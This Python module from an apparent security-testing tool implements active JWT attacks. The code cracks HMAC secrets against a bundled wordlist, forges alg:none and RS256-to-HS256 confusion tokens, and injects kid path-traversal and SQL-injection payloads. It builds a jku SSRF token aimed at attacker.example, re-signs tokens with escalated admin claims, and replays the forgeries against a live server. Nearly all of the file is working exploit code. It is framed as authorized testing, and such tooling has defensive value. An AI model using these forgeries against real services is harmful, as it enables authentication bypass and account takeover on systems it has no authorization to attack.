"""Active JWT manipulation testing.

Phase 73A. The existing `web_security.analyze_jwt` is *passive* — it decodes a
token and flags `alg:none` or notes "verify the HMAC secret is not weak". It
never actually tests anything. This module does the active work:

  - alg:none forgery (none / None / NONE / nOnE casing bypasses).
  - REAL offline HMAC-secret cracking: brute-force the signature against a
    wordlist. If the secret is weak, we recover it and can forge ANY token.
  - RS256 -> HS256 algorithm confusion: re-sign with the RSA public key used
    as the HMAC secret (the classic asymmetric->symmetric confusion).
  - kid header injection: path-traversal (kid -> a file with known contents,
    e.g. an empty key) and SQL-injection kid payloads.
  - jku / x5u SSRF: point the key-set URL at an attacker-controlled host.
  - Claim tampering + exp/nbf/iat validation review.

Honesty split:
  - The crypto core (decode, HS sign/verify, secret cracking, forgery
    construction) is pure and fully covered by offline unit tests — a token
    signed with a known weak secret is genuinely recovered.
  - Deciding whether a *server accepts* a forged token requires sending it to
    a live target. `live_acceptance_test()` does that via a caller-supplied
    send function and is explicitly the only network-touching path; it never
    fabricates an "accepted" result.

No external dependency (no PyJWT) — stdlib hmac/hashlib only.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
import time
from typing import Callable, Optional

log = logging.getLogger(__name__)

_HASH = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
         "HS512": hashlib.sha512}

# A real, compact wordlist of secrets that show up in tutorials, framework
# defaults, and leaked configs. Not fake data — these are the actual strings
# that crack a depressing share of real-world JWTs. Extend via `wordlist=`.
DEFAULT_SECRETS = [
    "secret", "password", "123456", "changeme", "admin", "test", "jwt",
    "jwtsecret", "jwt_secret", "jwtSecret", "secretkey", "secret_key",
    "your-256-bit-secret", "your-secret-key", "mysecret", "supersecret",
    "key", "private", "token", "s3cr3t", "p@ssw0rd", "qwerty", "letmein",
    "default", "example", "dev", "development", "production", "prod",
    "0000", "1234", "12345678", "secret123", "Secret", "SECRET",
    "HS256", "shhhhh", "hunter2", "passphrase", "auth", "api", "apikey",
    "node", "express", "django", "flask", "laravel", "symfony", "rails",
]


# ── base64url helpers ────────────────────────────────────────────────────
def b64url_decode(s: str) -> bytes:
    if isinstance(s, str):
        s = s.encode("ascii")
    s = s + b"=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def b64url_encode(b: bytes) -> str:
    if isinstance(b, str):
        b = b.encode("utf-8")
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")


def _encode_segment(obj) -> str:
    return b64url_encode(json.dumps(obj, separators=(",", ":")).encode("utf-8"))


# ── decode ────────────────────────────────────────────────────────────────
def decode_jwt(token: str) -> Optional[dict]:
    """Decode a JWT into its parts. Returns None if not a well-formed JWT."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
    except (ValueError, json.JSONDecodeError):
        return None
    return {
        "header": header,
        "payload": payload,
        "signature": b64url_decode(parts[2]) if parts[2] else b"",
        "signing_input": (parts[0] + "." + parts[1]).encode("ascii"),
        "raw": parts,
        "alg": str(header.get("alg", "")),
    }


# ── HMAC sign / verify ───────────────────────────────────────────────────
def sign_hmac(signing_input: bytes, secret, alg: str = "HS256") -> bytes:
    h = _HASH.get(alg.upper())
    if not h:
        raise ValueError(f"unsupported HMAC alg {alg}")
    if isinstance(secret, str):
        secret = secret.encode("utf-8")
    return hmac.new(secret, signing_input, h).digest()


def verify_hmac(token: str, secret, alg: Optional[str] = None) -> bool:
    dec = decode_jwt(token)
    if not dec:
        return False
    alg = (alg or dec["alg"]).upper()
    if alg not in _HASH:
        return False
    expected = sign_hmac(dec["signing_input"], secret, alg)
    return hmac.compare_digest(expected, dec["signature"])


# ── offline secret cracking ──────────────────────────────────────────────
def crack_hmac_secret(token: str, wordlist: Optional[list] = None
                      ) -> Optional[str]:
    """Brute-force the HMAC secret of an HS* token against a wordlist.

    Returns the recovered secret string, or None. This is a genuine offline
    crack — no network — that succeeds iff the secret is in the wordlist.
    """
    dec = decode_jwt(token)
    if not dec or dec["alg"].upper() not in _HASH:
        return None
    alg = dec["alg"].upper()
    sig = dec["signature"]
    si = dec["signing_input"]
    h = _HASH[alg]
    for candidate in (wordlist or DEFAULT_SECRETS):
        key = candidate.encode("utf-8") if isinstance(candidate, str) else candidate
        if hmac.compare_digest(hmac.new(key, si, h).digest(), sig):
            return candidate if isinstance(candidate, str) else candidate.decode(
                "utf-8", "replace")
    return None


# ── forgery primitives ────────────────────────────────────────────────────
def forge_alg_none(payload: dict, *, typ: str = "JWT") -> list[dict]:
    """Produce alg:none forgeries across the casing-bypass variants."""
    out = []
    for variant in ("none", "None", "NONE", "nOnE"):
        header = {"alg": variant, "typ": typ}
        token = f"{_encode_segment(header)}.{_encode_segment(payload)}."
        out.append({"attack": "alg_none", "alg_variant": variant,
                    "token": token,
                    "note": "Unsigned token — accepted if server honours alg:none"})
    return out


def forge_with_secret(payload: dict, secret, *, alg: str = "HS256",
                      extra_header: Optional[dict] = None) -> str:
    """Mint a validly-signed HS* token (use after crack_hmac_secret)."""
    header = {"alg": alg, "typ": "JWT"}
    if extra_header:
        header.update(extra_header)
    si = f"{_encode_segment(header)}.{_encode_segment(payload)}".encode("ascii")
    sig = sign_hmac(si, secret, alg)
    return si.decode("ascii") + "." + b64url_encode(sig)


def forge_alg_confusion(payload: dict, public_key_pem, *,
                        alg: str = "HS256") -> dict:
    """RS256->HS256 confusion: sign HS* using the RSA public key as the secret.

    A server that was hardened for RS256 but verifies with a generic
    `verify(token, key)` will use its *public* key as the HMAC secret — which
    the attacker also knows — so the forgery validates.
    """
    if isinstance(public_key_pem, str):
        public_key_pem = public_key_pem.encode("utf-8")
    token = forge_with_secret(payload, public_key_pem, alg=alg)
    return {"attack": "alg_confusion_rs_to_hs", "alg": alg, "token": token,
            "note": "RS256->HS256 confusion using the RSA public key as HMAC "
                    "secret — works if the verifier doesn't pin the algorithm"}


def forge_kid_injection(payload: dict) -> list[dict]:
    """kid-header injection forgeries.

    - Path traversal to a predictable-content file (/dev/null -> empty key),
      so we sign with an empty secret.
    - SQL-injection kid that may coerce the key lookup to return a known value.
    """
    out = []
    # /dev/null -> zero-byte key contents; sign with empty key.
    null_token = forge_with_secret(payload, b"", alg="HS256",
                                   extra_header={"kid": "../../../../dev/null"})
    out.append({"attack": "kid_path_traversal", "kid": "../../../../dev/null",
                "token": null_token, "signed_with": "empty key (/dev/null)",
                "note": "If kid is used as a file path, /dev/null yields an "
                        "empty key we signed with"})
    # SQLi kid returning a constant we control.
    sqli_kid = "x' UNION SELECT 'attacker'-- -"
    sqli_token = forge_with_secret(payload, "attacker", alg="HS256",
                                   extra_header={"kid": sqli_kid})
    out.append({"attack": "kid_sql_injection", "kid": sqli_kid,
                "token": sqli_token, "signed_with": "attacker",
                "note": "If kid feeds a SQL key lookup, UNION-select a known key"})
    return out


def forge_jku_ssrf(payload: dict, attacker_url: str, *,
                   header_field: str = "jku") -> dict:
    """Point jku/x5u at an attacker host (SSRF + key substitution surface)."""
    header = {"alg": "RS256", "typ": "JWT", header_field: attacker_url}
    # Signature is attacker-chosen in the real attack (we host the JWKS); here
    # we emit the manipulation token with an empty signature placeholder.
    token = f"{_encode_segment(header)}.{_encode_segment(payload)}."
    return {"attack": f"{header_field}_ssrf", header_field: attacker_url,
            "token": token,
            "note": f"Server may fetch {header_field} from attacker host; also "
                    f"an SSRF primitive"}


# ── claim validation review ──────────────────────────────────────────────
def analyze_claims(payload: dict, *, now: Optional[float] = None) -> list[dict]:
    now = now if now is not None else time.time()
    issues = []
    if "exp" not in payload:
        issues.append({"issue": "no_exp", "severity": "MEDIUM",
                       "note": "Token never expires — replay risk"})
    else:
        try:
            if float(payload["exp"]) < now:
                issues.append({"issue": "expired", "severity": "INFO",
                               "note": "Token already expired (test if still "
                                       "accepted — broken exp validation)"})
        except (TypeError, ValueError):
            issues.append({"issue": "malformed_exp", "severity": "LOW",
                           "note": "exp is not a numeric timestamp"})
    if "nbf" in payload:
        try:
            if float(payload["nbf"]) > now:
                issues.append({"issue": "not_yet_valid", "severity": "INFO",
                               "note": "nbf in the future"})
        except (TypeError, ValueError):
            pass
    if "alg" in payload:  # alg belongs in the header, not payload
        issues.append({"issue": "alg_in_payload", "severity": "LOW",
                       "note": "alg present in payload — possible confusion"})
    return issues


# ── orchestrator (offline) ────────────────────────────────────────────────
def audit_jwt(token: str, *, wordlist: Optional[list] = None,
              public_key_pem: Optional[str] = None,
              attacker_url: str = "https://attacker.example/jwks.json",
              now: Optional[float] = None) -> Optional[dict]:
    """Full OFFLINE JWT audit: decode, crack, and generate forgery candidates.

    Network-free. The returned `forgeries` are *candidates* to be replayed
    against the target via live_acceptance_test(); we never claim acceptance
    here.
    """
    dec = decode_jwt(token)
    if not dec:
        return None
    alg = dec["alg"].upper()
    result: dict = {
        "header": dec["header"], "payload": dec["payload"], "alg": alg,
        "claim_issues": analyze_claims(dec["payload"], now=now),
        "forgeries": [], "cracked_secret": None, "findings": [],
    }

    if alg == "NONE" or alg == "":
        result["findings"].append({
            "issue": "alg_none_accepted_by_token", "severity": "CRITICAL",
            "note": "Token itself uses alg:none"})

    # alg:none forgeries are always worth attempting.
    result["forgeries"].extend(forge_alg_none(dec["payload"]))

    if alg in _HASH:
        secret = crack_hmac_secret(token, wordlist)
        if secret is not None:
            result["cracked_secret"] = secret
            result["findings"].append({
                "issue": "weak_hmac_secret", "severity": "CRITICAL",
                "secret": secret,
                "note": f"HMAC secret recovered offline ('{secret}') — attacker "
                        f"can forge arbitrary valid tokens"})
            # Demonstrate full account takeover forgery (admin escalation).
            tampered = dict(dec["payload"])
            for esc in ("admin", "is_admin", "isAdmin", "role"):
                if esc == "role":
                    tampered[esc] = "admin"
                else:
                    tampered[esc] = True
            result["forgeries"].append({
                "attack": "claim_tamper_resign", "token":
                    forge_with_secret(tampered, secret, alg=alg),
                "tampered_claims": {k: tampered[k] for k in
                                    ("admin", "is_admin", "isAdmin", "role")},
                "note": "Re-signed with the cracked secret + escalated claims"})

    if alg.startswith("RS") and public_key_pem:
        result["forgeries"].append(
            forge_alg_confusion(dec["payload"], public_key_pem))

    if "kid" in dec["header"]:
        result["forgeries"].extend(forge_kid_injection(dec["payload"]))

    result["forgeries"].append(
        forge_jku_ssrf(dec["payload"], attacker_url, header_field="jku"))

    return result


def live_acceptance_test(forgeries: list[dict],
                         send_fn: Callable[[str], int]) -> list[dict]:
    """Replay forged tokens against a live target via a caller send function.

    `send_fn(token)` must perform the authenticated request with the given
    token and return the HTTP status code (or -1 on transport error). This is
    the ONLY network-touching function; acceptance is judged solely from the
    real server response, never assumed.
    """
    results = []
    for f in forgeries:
        token = f.get("token")
        if not token:
            continue
        try:
            status = send_fn(token)
        except Exception as e:  # noqa: BLE001 — caller transport may vary
            log.debug("live JWT replay failed: %s", e)
            status = -1
        accepted = status in (200, 201, 204, 301, 302)
        results.append({**f, "live_status": status, "accepted": accepted})
    return results
